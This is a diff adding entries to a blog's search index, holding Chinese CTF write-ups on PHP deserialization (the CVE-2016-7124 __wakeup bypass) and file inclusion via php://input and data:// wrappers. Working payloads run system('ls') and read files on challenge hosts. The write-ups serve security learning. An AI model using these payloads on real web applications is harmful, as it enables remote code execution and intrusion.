@@ -1,6 +1,69 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>unserialize3 wp</title>
+    <url>/2022/01/16/unserialize3/</url>
+    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
+
+<p>审计源码，看见__wakeup 以及题目unserialize3 猜想依旧是反序列化漏洞</p>
+<p><strong>这里需要用到CVE-2016-7124漏洞</strong></p>
+<blockquote>
+<p>当序列化字符串中表示对象属性个数大于真实的属性个数或值类型不匹配时会跳过__wakeup的执行.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class xctf&#123;</span><br><span class="line">	public $flag = &#x27;111&#x27;;</span><br><span class="line">	public function __wakeup()&#123;</span><br><span class="line">	exit(&#x27;bad requests&#x27;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	$b=serialize(new xctf);</span><br><span class="line">	echo ($b);</span><br><span class="line">?&gt;</span><br><span class="line">输出结果:</span><br><span class="line">O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br><span class="line">改为</span><br><span class="line">O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br><span class="line">浏览器输入</span><br><span class="line">http://111.200.241.244:64582/index.php?code=O:4:%22xctf%22:2:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/16/unserialize3/image-20220116235331921.png" alt="image-20220116235331921"></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>反序列化漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XTCTF Web_php_include</title>
+    <url>/2022/01/16/Web_php_include/</url>
+    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];<span class="comment">//显示GET请求后hello的值</span></span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];<span class="comment">//对page进行GET请求，赋值给page</span></span><br><span class="line"><span class="keyword">while</span> (strstr(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;<span class="comment">//把page和php：// 比较，若page中第一次出现php://，则把php://替代为空</span></span><br><span class="line">    <span class="variable">$page</span>=str_replace(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);<span class="comment">//包含page</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>打开网页 审计源码。</p>
+<p>由题目Web_php_include可知，该题可能是php中include的漏洞</p>
+<p>百度include漏洞，<a href="https://www.freebuf.com/articles/others-articles/256524.html">参考</a>  可知可以利用 php伪协议进行漏洞利用 <a href="https://www.cnblogs.com/weak-chicken/p/12275806.html">参考</a></p>
+<p>解法1：</p>
+<p>​    注意到strstr函数对大小写非常敏感<img src="/2022/01/16/Web_php_include/image-20220116232319078.png" alt="image-20220116232319078" style="zoom:50%;"></p>
+<p>我们则可以进行php://伪协议时，可以大写PHP，进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:49491/?page=PHP://input </span><br><span class="line">[POST请求] &lt;?php system(&quot;ls&quot;);?&gt;  #列出文件列表 后发现在fl4gisisish3r3.php中</span><br><span class="line">           &lt;?php system(&quot;cat fl4gisisish3r3.php&quot;);?&gt; #打开文件，发现flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/16/Web_php_include/image-20220116233217504.png" alt="image-20220116233217504"></p>
+<p>第二解法：</p>
+<p>​    利用data://伪协议绕过php协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:49491/?page=data://text//plain,%3C?php%20system(%22ls%22);?%3E</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/16/Web_php_include/image-20220116233423685.png" alt="image-20220116233423685"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:49491/?page=data://text//plain,%3C?php%20system(%22cat%20fl4gisisish3r3.php%22);?%3E（同第一种解法）</span><br><span class="line">可在源文件中找到flag</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2022/01/16/%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<p><strong>data://text/plain协议</strong></p>
+<p>此协议需要在双on的情况下才能使用，很常用的数据流构造器，将读取后面base编码字符串后解码的数据作为数据流的输入</p>
+<p>使用方法：data://text/plain;base64,base64编码字符 如<a href="http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p>
+<p>data://text/plain,字符  如<a href="http://127.0.0.1/cmd.php?file=data://text/plain">http://127.0.0.1/cmd.php?file=data://text/plain</a>,<?php phpinfo()?></p>
+<p><strong>php:input协议</strong></p>
+<p>此协议需要allow_url_include为on，可以访问请求的原始数据的只读流,  将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。</p>
+<p>使用方法：php://input,然后post需要执行的数据 如<a href="http://127.0.0.1/cmd.php?file=php://input">http://127.0.0.1/cmd.php?file=php://input</a>  然后在post中<?php phpinfo() ?><img src="/2022/01/16/%E4%BC%AA%E5%8D%8F%E8%AE%AE/1937742-20200208105940639-1014101743.png" alt="img"></p>
+]]></content>
+  </entry>
+  <entry>
     <title>Web_php_unserialize wp</title>
     <url>/2022/01/15/Web_php_unserialize/</url>
     <content><![CDATA[<h3 id="攻防世界-Web-php-unserialize-wp"><a href="#攻防世界-Web-php-unserialize-wp" class="headerlink" title="攻防世界:Web_php_unserialize wp"></a>攻防世界:Web_php_unserialize wp</h3><p>由题可知道，该题为php反序列化漏洞。</p>
